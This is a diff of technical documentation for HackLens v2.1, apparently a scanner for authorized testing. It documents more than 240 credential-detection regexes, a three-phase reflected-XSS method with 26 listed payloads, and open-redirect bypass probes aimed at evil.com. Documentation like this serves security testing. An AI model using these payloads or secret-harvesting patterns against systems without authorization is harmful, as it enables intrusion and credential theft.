@@ -1,4 +1,4 @@
-# HackLens — Technical Documentation
+# HackLens v2.1 — Technical Documentation
 
 **Created by Yogesh Bhandage | yogeshbhandage.com**
 *Built with AI using original ideas by the author. For authorized testing only.*
@@ -8,349 +8,471 @@
 ## Table of Contents
 
 1. [Architecture](#architecture)
-2. [Secret Detection — 162 Patterns](#secrets)
+2. [Secret Detection — 240+ Patterns](#secrets)
 3. [XSS Detection Technology](#xss)
 4. [Open Redirect Detection](#redirect)
-5. [Scope Enforcement](#scope)
-6. [False Positive Filtering](#fp)
-7. [Output Reference](#output)
-8. [Roadmap](#roadmap)
+5. [Information Disclosure Scanner](#infodisclosure)
+6. [Subdomain Enumeration](#subdomains)
+7. [Scope Enforcement](#scope)
+8. [False Positive Filtering](#fp)
+9. [Memory Management](#memory)
+10. [Output Reference](#output)
+11. [Roadmap](#roadmap)
 
 ---
 
 ## 1. Architecture {#architecture}
 
 ```
-hacklens.py -d target.com
+hacklens.py
 │
-├── STEP 0: Subdomain Enumeration
-│   └── crt.sh + Subfinder + Assetfinder + Amass
+├── MODE 1: -d target.com
+│   ├── STEP 0  Subdomain Enumeration (10+ sources)
+│   ├── STEP 0b httpx alive check
+│   ├── STEP 1  URL & JS Collection (7 sources)
+│   ├── STEP 2  Endpoint Extraction from JS
+│   ├── STEP 3  Secret Scanning (240+ patterns, chunked)
+│   ├── STEP 4  Reflected XSS (3-phase, 26 payloads)
+│   ├── STEP 5  Open Redirect (3-layer, 13 probes)
+│   └── STEP 6  Information Disclosure (70+ probes)
 │
-├── STEP 1 & 2: URL & JS Collection
-│   ├── Direct crawl (BeautifulSoup)
-│   ├── Katana (-jc deep JS crawl)
-│   ├── GAU (AlienVault OTX + Wayback + CommonCrawl)
-│   ├── Hakrawler (stdin)
-│   ├── SubJS (JS from HTML pages)
-│   ├── Wayback Machine CDX API (3 queries)
-│   └── waybackurls (stdin)
+├── MODE 2: -l urls.txt
+│   ├── STEP 1  Secret Scanning (all URLs)
+│   ├── STEP 2  XSS (parameterised URLs + JS endpoints)
+│   ├── STEP 3  Open Redirect (parameterised URLs)
+│   └── STEP 4  Information Disclosure
+│   Output: <domain>-urlscan/ (JSON + HTML only)
 │
-├── STEP 2.5: Endpoint Extraction
-│   └── fetch/axios/url:/BASE_URL patterns from JS content
-│
-├── STEP 3: Secret Scanning
-│   ├── JS files → jsbeautifier → 162 regex patterns
-│   ├── HTML/JSON/config → raw scan → 162 regex patterns
-│   └── Proactive: /.env, /.git/config, /actuator/env, etc.
-│
-├── STEP 4: Reflected XSS
-│   └── Phase 1: Canary → Phase 2: Context → Phase 3: Payload
-│
-└── STEP 5: Open Redirect
-    └── Layer 1: Location header → Layer 2: Body sinks → Layer 3: Chain
+└── MODE 3: -b burp_export.xml
+    ├── Parse Burp XML → extract all GET + POST requests
+    ├── STEP 1  Secret Scanning — TWO PASSES:
+    │   ├── Pass A (no network): scan request bodies directly
+    │   │   ├── URL query string params
+    │   │   ├── POST form body (url-encoded)
+    │   │   ├── POST JSON body
+    │   │   └── Multipart fields
+    │   └── Pass B (network): replay each request → scan response
+    │       ├── ALL status codes scanned: 200, 201, 301, 302, 401, 403, 404, 500
+    │       ├── Source label shows status: "url [response 403]"
+    │       └── Skips only binary content (image, video, zip, pdf)
+    ├── STEP 2  XSS — GET params + POST body params
+    ├── STEP 3  Open Redirect — GET params
+    └── STEP 4  Information Disclosure probes
+    Output: <domain>-burpscan/ (JSON + HTML only)
 ```
+
+### Burp XML Parser (`parse_burp_xml`)
+
+Parses Burp Suite XML format (Proxy → HTTP History → Save items):
+
+```
+For each <item> in XML:
+  ├── URL from <url>
+  ├── Method from <method>
+  ├── Request body: base64-decoded if base64="true"
+  ├── Hop-by-hop headers stripped (connection, transfer-encoding, etc.)
+  └── Params extracted by Content-Type:
+       ├── application/x-www-form-urlencoded → parse_qsl()
+       ├── application/json → json.loads() → flatten one level
+       └── multipart/form-data → parse name= fields
+```
+
+### POST XSS Testing Algorithm
+
+```
+For each POST item with body params:
+  For each param in params:
+    1. Inject canary into that param, POST to URL
+    2. Check if canary reflected in response
+    3. If yes → detect context (_detect_context)
+    4. Try each payload from _payloads_for_context
+    5. Confirm payload reflected + FP checks
+    6. Report "Reflected XSS (POST)" with PoC
+```
+
+### Why Pass A matters
+
+Secrets are often hardcoded in request bodies, not just responses:
+```json
+POST /api/config
+{"mysql_password":"secret123","api_key":"sk_live_abc"}
+```
+Pass A catches these without needing a live server response.
 
 ---
 
-## 2. Secret Detection — 162 Patterns {#secrets}
+## 2. Secret Detection — 240+ Patterns {#secrets}
 
 ### Pattern Types
 
 | Type | Description | Example |
 |------|-------------|---------|
-| **PREFIX** | Vendor-specific fixed prefix | `sk_live_`, `ghp_`, `AIza` |
-| **CONTEXT** | Quoted `"key": "value"` pair | `"api_key": "abc123"` |
-| **URI** | Connection string with credentials | `mongodb://user:pass@host` |
-| **PEM** | Exact private key header | `-----BEGIN RSA PRIVATE KEY-----` |
-| **STRUCTURE** | Fixed internal structure | Slack: `xox[baprs]-NNN-NNN-chars` |
+| PREFIX | Fixed vendor prefix | `sk_live_`, `ghp_`, `AIza`, `ya29.` |
+| CONTEXT | Quoted `"key": "value"` | `"api_key": "abc123"` |
+| ENV | Env var assignment | `SECRET_KEY=abc123` |
+| URI | Connection string with creds | `mongodb://user:pass@host` |
+| PEM | Private key header | `-----BEGIN RSA PRIVATE KEY-----` |
+| CAMELCASE | camelCase JS property | `secretKey: "abc123"` |
+| JSOBJECT | JSON object key-value | `{"password":"abc123"}` |
 
 ---
 
-### All 162 Patterns
+### Complete Pattern List
 
-#### ☁️ Cloud (8)
+#### ☁️ AWS (5 patterns)
 
-| # | Name | Regex | Notes |
-|---|------|-------|-------|
-| 1 | AWS Access Key | `(?<![A-Z0-9])(AKIA\|ABIA\|ACCA\|ASIA)[A-Z0-9]{16}(?![A-Z0-9])` | 4-char prefix + 16 uppercase. Boundary anchored. |
-| 2 | AWS Secret Key | `(?i)["'](?:aws[_-]?secret[_-]?(?:access[_-]?)?key\|AWS_SECRET_ACCESS_KEY)["']\s*[:=]\s*["']([A-Za-z0-9/+=]{40})["']` | Labeled. Exactly 40-char base64. |
-| 3 | AWS ARN | `arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:[0-9]{12}:[^\s'"]+` | Fixed `arn:aws:` prefix. |
-| 4 | Google API Key | `AIza[0-9A-Za-z\-_]{35}(?![A-Za-z0-9\-_])` | Fixed `AIza` + exactly 35 chars. |
-| 5 | Google OAuth Client | `[0-9]{6,}-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com` | Fixed `.apps.googleusercontent.com` suffix. |
-| 6 | Google Service Account | `["']type["']\s*:\s*["']service_account["'][^}]{0,500}["']private_key["']\s*:\s*["']-----BEGIN` | Requires both `type:service_account` AND `private_key:-----BEGIN` in same JSON object. |
-| 7 | Azure Storage Key | `AccountKey=[A-Za-z0-9+/]{88}==` | Connection string format. Exactly 88 base64 + `==`. |
-| 8 | Azure Client Secret | `(?i)["'](?:azure[_-]?client[_-]?secret\|AZURE_CLIENT_SECRET\|clientSecret)["']\s*[:=]\s*["']([A-Za-z0-9\-_~.]{34,})["']\s*[,}]` | Labeled. Must be followed by `,` or `}`. |
+| Pattern | Regex | Notes |
+|---------|-------|-------|
+| AWS Access Key | `(?<![A-Z0-9])(AKIA\|ABIA\|ACCA\|ASIA)[A-Z0-9]{16}` | Fixed prefix, boundary-anchored |
+| AWS Secret Key | `AWS_SECRET_ACCESS_KEY\s*[:=]\s*["']([A-Za-z0-9/+=]{40})["']` | Labeled, 40-char base64 |
+| AWS Session Token | `(?:AWS_SESSION_TOKEN\|SessionToken)\s*[:=,]\s*["']([A-Za-z0-9/+=]{100,})["']` | 100+ chars |
+| AWS MWS Auth Token | `amzn\.mws\.[0-9a-f]{8}-...-[0-9a-f]{12}` | Fixed UUID format |
+| AWS ARN | `arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:[0-9]{12}:[^\s"']+` | Fixed prefix |
 
-#### 💳 Payment (6)
+#### ☁️ Azure (5 patterns)
 
-| # | Name | Regex | Notes |
-|---|------|-------|-------|
-| 9 | Stripe Live Secret | `sk_live_[0-9a-zA-Z]{24,}` | Stripe's own prefix. |
-| 10 | Stripe Test Secret | `sk_test_[0-9a-zA-Z]{24,}` | |
-| 11 | Stripe Publishable | `pk_(?:live\|test)_[0-9a-zA-Z]{24,}` | |
-| 12 | Stripe Webhook | `whsec_[0-9a-zA-Z]{32,}` | |
-| 13 | PayPal Client ID | `(?i)["']paypal[_\-]?(?:client[_\-]?id\|clientid)["']\s*[:=]\s*["']([A-Za-z0-9\-_]{20,})["']` | Labeled. |
-| 14 | Braintree Token | `access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}` | Literal `$production$` separators. |
+| Pattern | Regex Key | Notes |
+|---------|-----------|-------|
+| Azure Storage Key | `AccountKey=[A-Za-z0-9+/=]{88}==` | Connection string format |
+| Azure Client Secret | `AZURE_CLIENT_SECRET\s*[:=]\s*["']([A-Za-z0-9~.-_]{34,})["']` | Labeled |
+| Azure Client ID | `AZURE_CLIENT_ID\s*[:=]\s*["']([UUID])["']` | UUID format, LOW |
+| Azure SAS Token | `(?:AZURE_SAS_TOKEN\|sas_token)\s*[:=]\s*["']([A-Za-z0-9%]{20,512})["']` | Labeled |
+| Azure Storage Full | `DefaultEndpointsProtocol=https;AccountName=...;AccountKey=` | Connection string |
 
-#### 🔐 Auth / Identity (14)
+#### 🟡 Google / GCP (5 patterns)
 
-| # | Name | Regex | Notes |
-|---|------|-------|-------|
-| 15 | JWT Token | `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{20,}(?![A-Za-z0-9_-])` | `eyJ` = base64(`{"`). 3 parts, minimum lengths, boundary anchor. |
-| 16 | Bearer Token | `[Bb]earer\s+([A-Za-z0-9][A-Za-z0-9\-_\.]{28,}[A-Za-z0-9])(?![A-Za-z0-9\-_\.])` | Value must start AND end with alphanum. |
-| 17 | Basic Auth URL | `https?://[A-Za-z0-9_%.-]+:(?=[^@]{6,}@)(?=[^@]*[^A-Za-z])[^@\s]{6,}@[A-Za-z0-9.-]+\.[a-z]{2,}` | Lookahead requires at least one non-alpha in password. |
-| 18 | GitHub Token | `ghp_[A-Za-z0-9]{36}` | Classic PAT format. |
-| 19 | GitHub OAuth | `gho_[A-Za-z0-9]{36}` | |
-| 20 | GitHub App Token | `(?:ghu\|ghs)_[A-Za-z0-9]{36}` | |
-| 21 | GitHub Fine-Grained | `github_pat_[A-Za-z0-9_]{82}` | |
-| 22 | GitLab Token | `glpat-[A-Za-z0-9\-_]{20}` | |
-| 23 | NPM Token | `npm_[A-Za-z0-9]{36}` | |
+| Pattern | Regex Key | Notes |
+|---------|-----------|-------|
+| Google API Key | `AIza[0-9A-Za-z\-_]{35}` | Fixed prefix |
+| Google OAuth Client | `[0-9]{6,}-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com` | Fixed suffix |
+| Google OAuth Token | `ya29\.[0-9A-Za-z\-_]{60,}` | Fixed prefix |
+| Google Client Secret | `GOOGLE_CLIENT_SECRET\s*[:=]\s*["']([A-Za-z0-9\-_]{24})["']` | Labeled, 24 chars |
+| GCP Service Account | `"type"\s*:\s*"service_account"...(500chars)..."private_key"..."-----BEGIN` | Must have both fields |
 
-#### 💬 Communication (9)
+#### 💳 Payment (9 patterns)
 
-| # | Name | Regex | Notes |
-|---|------|-------|-------|
-| 24 | Slack Token | `xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24,}` | xoxb=bot, xoxa=app, xoxp=user. Numeric workspace+user IDs. |
-| 25 | Slack Webhook | `https://hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{24,}` | |
-| 26 | Discord Token | `(?i)["'](?:discord[_-]?(?:bot[_-]?)?token\|DISCORD_TOKEN)["']\s*[:=]\s*["']([MNO][A-Za-z0-9]{23}\.[A-Za-z0-9-_]{6}\.[A-Za-z0-9-_]{27})["']` | Labeled — raw format too broad. |
-| 27 | Discord Webhook | `https://discord(?:app)?\.com/api/webhooks/[0-9]{17,19}/[A-Za-z0-9\-_]{60,}` | |
-| 28 | Telegram Bot Token | `(?<!\d)[0-9]{8,10}:[A-Za-z0-9_\-]{35}(?![A-Za-z0-9_\-])` | 8-10 digit bot ID + 35-char token. |
-| 29 | Twilio Account SID | `(?i)["'](?:twilio[_-]?(?:account[_-]?)?sid\|TWILIO_ACCOUNT_SID)["']\s*[:=]\s*["']AC([a-f0-9]{32})["']` | Labeled — bare `AC`+hex matched CSS colors. |
-| 30 | Twilio Auth Token | Labeled context + 32 hex | |
-| 31 | SendGrid API Key | `SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}` | Fixed structure: `SG.` + 22 + `.` + 43. |
-| 32 | Mailgun API Key | `(?i)["'](?:mailgun[_-]?(?:api[_-]?)?key\|MAILGUN_API_KEY)["']\s*[:=]\s*["']key-([0-9a-zA-Z]{32})["']` | Labeled — bare `key-` was too broad. |
+| Pattern | Regex Key | Notes |
+|---------|-----------|-------|
+| Stripe Live Secret | `sk_live_[0-9a-zA-Z]{24,}` | Prefix |
+| Stripe Test | `(sk\|pk\|rk)_test_[0-9A-Za-z]{24,}` | Prefix |
+| Stripe Restricted | `rk_live_[0-9A-Za-z]{24,}` | Prefix |
+| Stripe Publishable | `pk_live_[0-9A-Za-z]{24,}` | Prefix |
+| Stripe Webhook | `whsec_[0-9a-zA-Z]{32,}` | Prefix |
+| Square Access | `sq0atp-[0-9A-Za-z\-_]{22}` | Prefix |
+| Square OAuth | `sq0csp-[0-9A-Za-z\-_]{43}` | Prefix |
+| PayPal Client Secret | `PAYPAL_CLIENT_SECRET\s*[:=]\s*["']([A-Za-z0-9\-_]{60,100})["']` | Labeled |
+| Braintree Token | `access_token$production$[0-9a-z]{16}$[0-9a-f]{32}` | Literal separators |
 
-#### 🤖 AI / ML (4)
+#### 🔐 Auth / Identity (13 patterns)
 
-| # | Name | Regex | Notes |
-|---|------|-------|-------|
-| 33 | OpenAI Key (old) | `sk-[A-Za-z0-9]{20,50}T3BlbkFJ[A-Za-z0-9]{20,50}` | `T3BlbkFJ` = base64("OpenAI") — hardcoded anchor. |
-| 34 | OpenAI Key (proj) | `sk-proj-[A-Za-z0-9\-_]{40,}` | New project key format. |
-| 35 | Anthropic Key | `sk-ant-(?:api03-)?[A-Za-z0-9\-_]{90,}` | |
-| 36 | Hugging Face Token | `hf_[A-Za-z0-9]{34,}` | |
+| Pattern | Regex Key |
+|---------|-----------|
+| JWT Token | `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{20,}` |
+| Bearer Token | `[Bb]earer\s+([A-Za-z0-9][A-Za-z0-9\-_\.]{28,}[A-Za-z0-9])` |
+| Bearer Token (env) | `(?:BEARER_TOKEN\|bearerToken)\s*[:=]\s*["']([A-Za-z0-9\-_.+/=]{20,512})["']` |
+| Basic Auth URL | `https?://user:pass_with_non_alpha@host` |
+| OAuth Token | `(?:OAUTH_TOKEN\|oauthToken)\s*[:=]\s*["']([A-Za-z0-9\-_.+/=]{20,512})["']` |
+| OAuth Client ID | `OAUTH_CLIENT_ID\s*[:=]\s*["']([A-Za-z0-9\-_]{8,128})["']` |
+| OAuth Client Secret | `OAUTH_CLIENT_SECRET\s*[:=]\s*["']([A-Za-z0-9\-_]{16,256})["']` |
+| Access Token (env) | `(?:ACCESS_TOKEN\|accessToken)\s*[:=]\s*["']([A-Za-z0-9\-_.+/=]{20,512})["']` |
+| Refresh Token (env) | `(?:REFRESH_TOKEN\|refreshToken)\s*[:=]\s*["']([A-Za-z0-9\-_.+/=]{20,512})["']` |
+| Session ID | `(?:SESSION_ID\|sessionId\|PHPSESSID\|JSESSIONID)\s*[:=]\s*["']([A-Za-z0-9\-_]{20,256})["']` |
+| GitHub (4 formats) | `ghp_`, `gho_`, `ghu/ghs_`, `github_pat_` + fixed lengths |
+| GitLab Token | `glpat-[A-Za-z0-9\-_]{20}` |
+| NPM Token | `npm_[A-Za-z0-9]{36}` |
 
-#### 🗄️ Database (7)
+#### 💬 Communication (9 patterns)
 
-| # | Name | Regex | Notes |
-|---|------|-------|-------|
-| 37 | MongoDB URI | `mongodb(?:\+srv)?://[A-Za-z0-9_\-]+:[^@\s'"<>]{4,}@[^\s'"<>]+` | Requires `user:pass@host` — bare URIs ignored. |
-| 38 | MySQL URI | `mysql://[A-Za-z0-9_\-]+:[^@\s'"<>]{4,}@[^\s'"<>]+` | |
-| 39 | PostgreSQL URI | `postgres(?:ql)?://[A-Za-z0-9_\-]+:[^@\s'"<>]{4,}@[^\s'"<>]+` | |
-| 40 | Redis URI | `redis://[A-Za-z0-9_\-]+:[^@\s'"<>]{4,}@[^\s'"<>]+` | |
-| 41 | Database Password | `(?i)["'](?:db\|database)[_\-]?(?:pass(?:word)?\|pwd)["']\s*:\s*["']([^\s'"<>{},]{8,})["']` | Labeled. |
-| 90 | Elasticsearch URI | `https?://user:[^@\s<>]{4,}@host*elasticsearch*` | Credentials required. |
-| 93 | Neo4j URI | `bolt://user:[^@\s<>]{4,}@host` | |
+| Pattern | Regex Key |
+|---------|-----------|
+| Slack Bot | `xoxb-[0-9]{9,13}-[0-9]{9,13}-[A-Za-z0-9]{24,}` |
+| Slack User | `xoxp-[0-9]{9,13}-[0-9]{9,13}-[0-9]{9,13}-[0-9a-f]{32}` |
+| Slack Workspace | `xoxa-[0-9A-Za-z\-]{50,}` |
+| Slack Webhook | `https://hooks.slack.com/services/T.../B.../...` |
+| Discord Webhook | `https://discord.com/api/webhooks/[0-9]{17,19}/[A-Za-z0-9\-_]{60,}` |
+| Discord Token | `DISCORD_TOKEN\s*[:=]\s*["']([MNO][A-Za-z0-9]{23}\.[6chars]\.[27chars])["']` |
+| Telegram Bot | `(?<!\d)[0-9]{8,10}:[A-Za-z0-9_\-]{35}` |
+| Twilio Account SID | `TWILIO_ACCOUNT_SID\s*[:=]\s*["']AC([a-f0-9]{32})["']` — labeled |
+| SendGrid | `SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}` |
 
-#### 🔑 SSH / Private Keys (5)
+#### 🤖 AI / ML (4 patterns)
 
-```
------BEGIN RSA PRIVATE KEY-----
------BEGIN EC PRIVATE KEY-----
------BEGIN PGP PRIVATE KEY BLOCK-----
------BEGIN OPENSSH PRIVATE KEY-----
------BEGIN (DSA|ENCRYPTED) PRIVATE KEY-----
-```
-Zero false positives — unique to actual key files.
+| Pattern | Regex Key |
+|---------|-----------|
+| OpenAI (old) | `sk-[A-Za-z0-9]{20,50}T3BlbkFJ[A-Za-z0-9]{20,50}` — `T3BlbkFJ`=base64("OpenAI") anchor |
+| OpenAI (proj) | `sk-proj-[A-Za-z0-9\-_]{40,}` |
+| Anthropic | `sk-ant-(?:api03-)?[A-Za-z0-9\-_]{90,}` |
+| HuggingFace | `hf_[A-Za-z0-9]{34,}` |
 
-#### 👤 Credentials (3)
+#### 🗄️ Database (10 patterns)
 
-| # | Name | How FP is Prevented |
-|---|------|---------------------|
-| 47 | Username | Value must be 4-30 chars, start with alphanum |
-| 48 | Password | Lookaheads: must have uppercase + lowercase + digit or special char |
-| 49 | Hardcoded Credential | Both username AND password must be quoted, within 100 chars of each other |
+| Pattern | Regex Key |
+|---------|-----------|
+| MongoDB URI | `mongodb(?:\+srv)?://user:pass@host` |
+| MySQL URI | `mysql://user:pass@host` |
+| PostgreSQL URI | `postgres(?:ql)?://user:pass@host` |
+| Redis URI | `redis://user:pass@host` |
+| Elasticsearch URI | `https?://user:pass@host*elasticsearch` |
+| PGPASSWORD | `PGPASSWORD\s*[:=]\s*["']([^"']{4,128})["']` |
+| MySQL Password | `mysql_pass(?:word)?\s*[:=]\s*["']([^"']{6,128})["']` |
+| MySQL Username | `mysql_user(?:name)?\s*[:=]\s*["']([^"']{3,64})["']` |
+| MySQL Server | `mysql_(?:server\|host)\s*[:=]\s*["']([^"']{4,256})["']` |
+| Redis Password | `redis_(?:pass(?:word)?\|auth)\s*[:=]\s*["']([^"']{4,128})["']` |
 
-#### 🔒 Cryptography (5)
-Crypto IV, Encryption Key, Crypto Salt, Hex Secret, HMAC Secret — all labeled context required.
+#### 🔒 Crypto / Keys (11 patterns)
 
-#### ☁️ Infrastructure (6)
-Heroku (labeled UUID), Firebase URL/API Key, S3 Bucket (quoted), Internal IP (string context), Vault Token, Docker Hub Token.
+| Pattern | Regex Key |
+|---------|-----------|
+| RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` |
+| EC Private Key | `-----BEGIN EC PRIVATE KEY-----` |
+| DSA Private Key | `-----BEGIN DSA PRIVATE KEY-----` |
+| PGP Private Key | `-----BEGIN PGP PRIVATE KEY BLOCK-----` |
+| OpenSSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` |
+| Generic Private Key | `-----BEGIN PRIVATE KEY-----` |
+| Certificate | `-----BEGIN CERTIFICATE-----` |
+| AES Key | `(?:AES_KEY\|aesKey\|CIPHER_KEY\|ENCRYPT_KEY)\s*[:=]\s*["']([A-Za-z0-9+/=\-_]{16,512})["']` |
+| Master Key | `(?:MASTER_KEY\|MASTER_SECRET\|ROOT_KEY)\s*[:=]\s*["']([A-Za-z0-9\-_+/=]{16,256})["']` |
+| HMAC Secret | `(?:HMAC_SECRET\|hmacSecret\|HMAC_KEY)\s*[:=]\s*["']([A-Za-z0-9\-_+/=]{16,256})["']` |
+| PBKDF Secret | `(?:PBKDF_SECRET\|SCRYPT_SECRET\|KDF_SECRET)\s*[:=]\s*["']([^"']{8,256})["']` |
 
-#### 🛠️ DevOps / CI-CD (15+)
-Datadog, New Relic (`NRII-` prefix), Dynatrace (`dt0x00.24chars.64chars`), Grafana, Splunk HEC, Rollbar, Bugsnag, CircleCI, Travis CI, Terraform, Vercel, Netlify, Render (`rnd_`), Railway, Fly.io (`fo1_`).
+#### 🧩 CamelCase (14 patterns)
 
-#### 🌐 Social / SaaS (10+)
-Twitter Bearer (22 A's prefix), Facebook (`EAACEdEose0cBA`), Mapbox (`pk.eyJ1`), Shopify (`shpat_`/`shpss_`), Algolia, Cloudflare, DigitalOcean, Square (`sq0atp-`/`sq0csp-`), Razorpay (`rzp_live/test_`).
+All use `(?<![A-Za-z])` negative lookbehind to prevent matching inside longer identifiers:
 
-#### 🔏 Auth / SSO (5)
-Auth0, Okta (labeled), OneLogin, Keycloak — all labeled context required.
+`apiKey`, `secretKey`, `authToken`, `clientSecret`, `privateKey`, `encryptionKey`, `dbPassword`, `accessToken`, `jwtSecret`, `webhookSecret`, `signingSecret`, `cookieSecret`, `sessionSecret`, `refreshToken`
 
-#### 📧 Email (6)
-Postmark, SparkPost, Resend (`re_` + 20-26 alphanum, no underscores), Loops, Brevo (`xkeysib-64hex-16chars`), Mailchimp (labeled).
+#### 📦 JS Object (3 patterns)
 
-#### 📋 Productivity / SaaS (12+)
-Notion (labeled), Linear (`lin_api_`), Airtable PAT (`pat14chars.64hex`), Jira, Confluence, HubSpot, Salesforce, Webflow, Contentful, Sanity (labeled), Sentry DSN (`hex32@sentry.io`), Intercom, Pusher, Amplitude.
+Match `{"key":"value"}` format:
+- `JS Object Secret/Password` — keys: secret, apikey, password, secretkey, privatekey, encryptionkey, mysql_password
+- `JS Object DB Credential` — keys: db_pass, db_password, mysql_password, redis_password
+- `JS Object Token` — keys: access_token, refresh_token, id_token, bearer_token, oauth_token
+
+#### 🔍 Exposure / Infrastructure (20+ patterns)
+
+Shopify, Algolia, Mapbox, Firebase, Vault, Databricks (`dapi`), Kubernetes, Terraform, CircleCI, DigitalOcean, Heroku (labeled), `.env` in href/src, `.git` in href/src, UUID in sensitive key context, S3 bucket (quoted), Internal IP (RFC1918), LDAP Password, FTP/SSH Password
+
+#### 🌍 Social (4 patterns)
+
+Twitter Access Token, Twitter OAuth Token, Facebook Access Token (`EAA`), Google OAuth Token (`ya29.`)
 
 ---
 
 ## 3. XSS Detection Technology {#xss}
 
-### Design Principle
-Zero false positives through canary-first confirmation. Every reported finding is proven exploitable.
-
 ### 3-Phase Algorithm
 
 ```
-For each URL with parameters:
-│
-├── PHASE 1: Reflection Check
-│   ├── Generate unique canary: SHXSSrandom12chars
-│   ├── Inject canary as param value: ?param=SHXSSk3m9pzxq1r4
-│   ├── Fetch response
-│   ├── IF canary not found → SKIP (no reflection)
-│   ├── IF canary HTML-encoded (&lt; etc.) → SKIP (safe encoding)
-│   └── IF canary verbatim unencoded → PROCEED to Phase 2
-│
-├── PHASE 2: Context Detection
-│   ├── Find canary position in HTML
-│   ├── Look back 200-500 chars for context clues
-│   ├── Check if inside <script> block:
-│   │   ├── Detect JSON data blocks (NOT executable):
-│   │   │   type="application/json"
-│   │   │   id="__NEXT_DATA__" (Next.js)
-│   │   │   id="__NUXT_DATA__" (Nuxt.js)
-│   │   │   id="__REDUX_STATE__"
-│   │   │   id="__RELAY_STORE__"
-│   │   │   → Return NULL (skip, not exploitable)
-│   │   ├── Count unescaped " → js_string_dq
-│   │   ├── Count unescaped ' → js_string_sq
-│   │   └── Neither → js_code
-│   ├── Check if inside HTML tag:
-│   │   ├── After ="  → attr_double
-│   │   ├── After ='  → attr_single
-│   │   └── After =   → attr_unquoted
-│   ├── Check if inside href/src/action → url_param
-│   └── Default → html_body
-│
-└── PHASE 3: Context-Specific Payload
-    ├── Choose payload for detected context
-    ├── Inject payload: ?param=<payload>
-    ├── Fetch response
-    ├── Check payload regex matches in response
-    ├── For js_code: verify preceding char is NOT a quote
-    └── IF confirmed → REPORT with PoC URL
+Phase 1: Canary Injection
+  → Generate SHXSSrandom12
+  → Inject as param value
+  → Skip if HTML-encoded OR not reflected
+
+Phase 2: Context Detection (500-char lookback)
+  → Detect 8 contexts
+  → Skip JSON data blocks:
+     __NEXT_DATA__, __NUXT_DATA__, __REDUX_STATE__
+     type="application/json", type="text/template"
+
+Phase 3: Multi-Payload Per Context
+  → Try each payload in order
+  → Stop on first confirmed
+  → FP checks per context type
+  → Report PoC URL
 ```
 
-### Payload Table
+### FP Checks Per Context
 
-| Context | Payload | Exploits |
-|---------|---------|---------|
-| `html_body` | `<img src=x id=SHXSS onerror=alert(1)>` | Direct tag injection |
-| `attr_double` | `" onfocus=alert(1) autofocus data-x="SHXSS` | Break double quote |
-| `attr_single` | `' onfocus=alert(1) autofocus data-x='SHXSS` | Break single quote |
-| `attr_unquoted` | `><img src=x id=SHXSS onerror=alert(1)><x ` | Close tag, inject new |
-| `js_string_dq` | `"-alert(1)-"SHXSS` | Break JS string |
-| `js_string_sq` | `'-alert(1)-'SHXSS` | Break JS string |
-| `js_code` | `;/*SHXSS*/alert(1)//` | Statement separator |
-| `url_param` | `javascript:alert(1)//SHXSS` | JS URI injection |
+| Context | FP Check |
+|---------|----------|
+| `attr_*` | Payload must NOT appear only HTML-encoded |
+| `js_code` | Preceding char must NOT be a quote (still in string) |
+| `<script>` | Must appear as `<script>`, not `&lt;script&gt;` |
 
-### Deduplication
+### All 26 Payloads
 
-- URLs normalised: scheme stripped, params sorted
-- Same `netloc + path + param` reported only once
-- Logger deduplicates by MD5 hash of `type:value`
+**html_body:**
+```
+<img src=x id=CANARY onerror=alert(1)>
+><script>alert(1)//CANARY</script>
+<svg id=CANARY onload=alert(1)>
+<details id=CANARY open ontoggle=alert(1)>
+<input id=CANARY autofocus onfocus=alert(1)>
+```
+
+**attr_double:**
+```
+"><script>alert(1)//CANARY</script>
+"><img src=x id=CANARY onerror=alert(1)>
+" onfocus=alert(1) autofocus id="CANARY
+" onmouseover=alert(1) id="CANARY
+```
+
+**attr_single:**
+```
+'><script>alert(1)//CANARY</script>
+'><img src=x id=CANARY onerror=alert(1)>
+' onfocus=alert(1) autofocus id='CANARY
+' onmouseover=alert(1) id='CANARY
+```
+
+**attr_unquoted:**
+```
+><img src=x id=CANARY onerror=alert(1)><x
+><script>alert(1)//CANARY</script><x
+```
+
+**js_string_dq:**
+```
+";alert(1)//CANARY
+"-alert(1)-"CANARY
+"+alert(1)+"CANARY
+```
+
+**js_string_sq:**
+```
+';alert(1)//CANARY
+'-alert(1)-'CANARY
+'+alert(1)+'CANARY
+```
+
+**js_code:**
+```
+;/*CANARY*/alert(1)//
+;alert(1)//CANARY
+\nalert(1)//CANARY
+```
+
+**url_param:**
+```
+javascript:alert(1)//CANARY
+javascript://CANARY/%0aalert(1)
+```
 
 ---
 
 ## 4. Open Redirect Detection {#redirect}
 
 ### Canary Domain
+`evil.com` — industry-standard test domain
+
+### Core Rule
+`evil.com` must be the **destination host**, not a query param value:
 ```
-evil.com
+❌ FP: Location: https://gcore.com/login?return=https://evil.com
+✅ REAL: Location: https://evil.com/page
 ```
-Industry-standard test domain. Any redirect to this domain = confirmed finding.
 
 ### 13 Bypass Probes
 
-| Probe | Bypass Technique |
-|-------|-----------------|
-| `https://evil.com` | Standard HTTPS |
-| `http://evil.com` | Standard HTTP |
+| Probe | Bypass Type |
+|-------|-------------|
+| `https://evil.com` | Standard |
+| `http://evil.com` | HTTP |
 | `//evil.com` | Protocol-relative |
 | `https://evil.com/` | Trailing slash |
-| `https://evil.com/%2F..` | URL-encoded path traversal |
-| `@evil.com` | `@` host confusion |
-| `////evil.com` | Multiple slashes bypass |
-| `\tevil.com` | Tab character prefix |
+| `https://evil.com/%2F..` | Path traversal |
+| `@evil.com` | @ confusion |
+| `////evil.com` | Multiple slashes |
+| `\tevil.com` | Tab prefix |
 | `https:evil.com` | Missing slashes |
-| `/%09/evil.com` | Horizontal tab in path |
+| `/%09/evil.com` | Horizontal tab |
